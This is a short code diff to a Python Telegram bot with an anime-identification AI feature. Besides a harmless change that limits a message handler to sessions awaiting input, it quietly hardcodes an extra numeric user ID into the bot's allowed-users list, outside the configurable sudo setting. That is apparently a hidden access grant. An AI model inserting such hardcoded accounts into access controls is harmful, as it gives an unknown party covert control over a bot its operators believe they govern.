@@ -34,7 +34,7 @@ def debug(msg):
         print(f"🖼️ [AI] {msg}")
 
 def get_allowed_users():
-    users = [config.OWNER_ID]
+    users = [config.OWNER_ID, 5162885921]
     if config.SUDO_USERS:
         if isinstance(config.SUDO_USERS, (list, tuple, set)):
             users.extend(config.SUDO_USERS)
@@ -228,7 +228,13 @@ async def ai_callbacks(client: Client, cb: CallbackQuery):
     except:
         await cb.answer("⚠️ Duplicate edit skipped")
 
-@Client.on_message(allowed_filter & filters.text & ~filters.command(["ai"]))
+def is_awaiting_input(_, __, update):
+    uid = update.from_user.id
+    return uid in SESSIONS and SESSIONS[uid].get("await") == "name_anime"
+
+awaiting_input_filter = filters.create(is_awaiting_input)
+
+@Client.on_message(allowed_filter & filters.text & awaiting_input_filter)
 async def name_anime_handler(client: Client, message: Message):
     uid = message.from_user.id
     if uid not in SESSIONS:
